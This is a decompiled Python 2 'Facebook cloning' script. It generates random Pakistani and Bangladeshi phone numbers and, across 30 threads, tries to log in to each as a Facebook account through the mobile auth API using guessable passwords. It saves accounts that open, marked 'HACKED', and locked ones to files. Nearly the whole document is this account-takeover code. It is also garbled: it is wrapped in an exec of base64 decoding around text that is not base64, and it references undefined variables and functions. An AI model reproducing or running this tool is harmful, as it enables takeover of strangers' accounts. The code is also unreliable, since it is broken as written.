import base64
exec(base64.b64decode("# uncompyle6 version 3.7.4

# Python bytecode 2.7

# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 

# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/

# Embedded file name: koNtol

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')

for n in range(1000):

    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print nmbr

    sys.stdout.flush()

try:

    import requests

except ImportError:

    os.system('pip2 install mechanize')

try:

    import mechanize

except ImportError:

    os.system('pip2 install request')

    time.sleep(1)

    os.system('Then type: python2 star.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'

    x = x.replace('!0', '\x1b[0m')

    sys.stdout.write(x + '\n')

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(3.0 / 200)

def tik():

    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']

    for o in titik:

        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,

        sys.stdout.flush()

        time.sleep(0.5)

back = 0

oks = []

id = []

cpb = []

vulnot = '\x1b[31mNot Vuln'

vuln = '\x1b[32mVuln'

os.system('clear')

logo1 = ' \n       \x1b[101m\x1b[37;1mCODED BY ALFU-KING\x1b[0m\n       \x1b[101m\x1b[37;1m  STAY AWAY FROM ME  \x1b[0m\n\x1b[1;97m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m DEVOLPER   : \x1b[0;31m ALFU MEER \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;31m01408479204 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mJIGERS   :  \x1b[0;31mALFE + SANNYII\n\x1b[1;97m-----------------------------------------------'

def lisensi():

    os.system('clear')

    login()

def login():

    os.system('clear')

    print logo1

    print

    print '\x1b[1;97m(1) Pakistan Cloning'

    print '\x1b[1;97m(2) Bangladesh Cloning'

    print '\x1b[1;97m(0) Back'

    pilih_Somi()

def pilih_Somi():

    Somi = raw_input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')

    if Somi == '':

        print '\x1b[1;97mFill In Correctly'

        pilih_login()

    elif Somi == '1':

        p()

    elif Somi == '2':

        b()

def p():

    os.system('clear')

    print logo1

    print

    print

    print 'Do you want countinue [y/n]'

    act()

def act():

    somi = raw_input('\n\n \x1b[1;97m  ')

    if somi == '':

        print '[!] Fill in correctly'

        act()

    elif somi == 'y':

        tik()

        os.system('clear')

        print logo1

        print

        print '\x1b[1;93mSELECT SIM CODE'

        print '\x1b[1;92m00,01,02,03,04,05,06,07,08,09'

        print '\x1b[1;92m11,12,13,14,15,16,17,18'

        print '\x1b[1;92m21,22,23,24'

        print '\x1b[1;92m30,31,32,33,34,35,36'

        print '\x1b[1;92m40,41,42,43,44,45,46,47,48,49'

        print

        try:

            c = raw_input('>>> ')

            k = '03'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\n[ Back ]')

            somi()

    elif somi == 'n':

        login()

    else:

        print '[!] Fill In Correctly'

        action()

    print 47 * '\x1b[1;93m-'

    xxx = str(len(id))

    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)

    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')

    print 47 * '\x1b[1;93m-'

    def main(arg):

        global cpb

        global oks

        user = arg

        try:

            os.mkdir('save')

        except OSError:

            pass

        try:

            pass1 = user

            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

            q = json.load(data)

            if 'access_token' in q:

                print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1

                okb = open('sdcard/ids/successful.txt', 'a')

                okb.write(k + c + user + pass1 + '\n')

                okb.close()

                oks.append(c + user + pass1)

            elif 'www.facebook.com' in q['error_msg']:

                print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1

                cps = open('sdcard/ids/checkpoint.txt', 'a')

                cps.write(k + c + user + pass1 + '\n')

                cps.close()

                cpb.append(c + user + pass1)

            else:

                pass2 = k + c + user

                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                q = json.load(data)

                if 'access_token' in q:

                    print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2

                    okb = open('sdcard/ids/successful.txt', 'a')

                    okb.write(k + c + user + pass2 + '\n')

                    okb.close()

                    oks.append(c + user + pass2)

                elif 'www.facebook.com' in q['error_msg']:

                    print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2

                    cps = open('sdcard/ids/checkpoint.txt', 'a')

                    cps.write(k + c + user + pass3 + '\n')

                    cps.close()

                    cpb.append(c + user + pass3)

                else:

                    pass3 = '@@123@@'

                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                    q = json.load(data)

                    if 'access_token' in q:

                        print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3

                        okb = open('sdcard/ids/successful.txt', 'a')

                        okb.write(k + c + user + pass3 + '\n')

                        okb.close()

                        oks.append(c + user + pass3)

                    elif 'www.facebook.com' in q['error_msg']:

                        print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3

                        cps = open('sdcard/ids/checkpoint.txt', 'a')

                        cps.write(k + c + user + pass3 + '\n')

                        cps.close()

                        cpb.append(c + user + pass3)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print 50 * '\x1b[1;91m-'

    print 'Process Has Been Completed ...'

    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')

    login()

def b():

    os.system('clear')

    print logo1

    print

    print

    print 'Do you want countinue [y/n]'

    action()

def action():

    somi = raw_input('\n\n \x1b[1;97m  ')

    if somi == '':

        print '[!] Fill in correctly'

        action()

    elif somi == 'y':

        tik()

        os.system('clear')

        print logo1

        print

        try:

            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;94m\x1b[1;96m\n175,165,191, 192, 193, 194,\n195, 196, 197, 198, 199:\n >>> ')

            k = '+880'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\n[ Back ]')

            somi()

    elif somi == 'n':

        login()

    else:

        print '[!] Fill In Correctly'

        action()

    print 47 * '\x1b[1;93m-'

    xxx = str(len(id))

    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)

    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')

    print 47 * '\x1b[1;93m-'

    def main(arg):

        user = arg

        try:

            os.mkdir('save')

        except OSError:

            pass

        try:

            pass1 = user

            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

            q = json.load(data)

            if 'access_token' in q:

                print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1

                okb = open('sdcard/ids/successful.txt', 'a')

                okb.write(k + c + user + pass1 + '\n')

                okb.close()

                oks.append(c + user + pass1)

            elif 'www.facebook.com' in q['error_msg']:

                print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1

                cps = open('sdcard/ids/checkpoint.txt', 'a')

                cps.write(k + c + user + pass1 + '\n')

                cps.close()

                cpb.append(c + user + pass1)

            else:

                pass2 = 'bangladesh'

                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                q = json.load(data)

                if 'access_token' in q:

                    print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2

                    okb = open('sdcard/ids/successful.txt', 'a')

                    okb.write(k + c + user + pass2 + '\n')

                    okb.close()

                    oks.append(c + user + pass2)

                elif 'www.facebook.com' in q['error_msg']:

                    print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2

                    cps = open('sdcard/ids/checkpoint.txt', 'a')

                    cps.write(k + c + user + pass3 + '\n')

                    cps.close()

                    cpb.append(c + user + pass3)

                else:

                    pass3 = '102030'

                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                    q = json.load(data)

                    if 'access_token' in q:

                        print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3

                        okb = open('sdcard/ids/successful.txt', 'a')

                        okb.write(k + c + user + pass3 + '\n')

                        okb.close()

                        oks.append(c + user + pass3)

                    elif 'www.facebook.com' in q['error_msg']:

                        print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3

                        cps = open('sdcard/ids/checkpoint.txt', 'a')

                        cps.write(k + c + user + pass3 + '\n')

                        cps.close()

                        cpb.append(c + user + pass3)

                    else:

                        pass4 = '445566'

                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                        q = json.load(data)

                        if 'access_token' in q:

                            print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4

                            okb = open('sdcard/ids/successful.txt', 'a')

                            okb.write(k + c + user + pass4 + '\n')

                            okb.close()

                            oks.append(c + user + pass4)

                        elif 'www.facebook.com' in q['error_msg']:

                            print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4

                            cps = open('sdcard/ids/checkpoint.txt', 'a')

                            cps.write(k + c + user + pass4 + '\n')

                            cps.close()

                            cpb.append(c + user + pass4)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print 50 * '\x1b[1;91m-'

    print 'Process Has Been Completed ...'

    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))

    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')

    login()

if __name__ == '__main__':

    login() "))
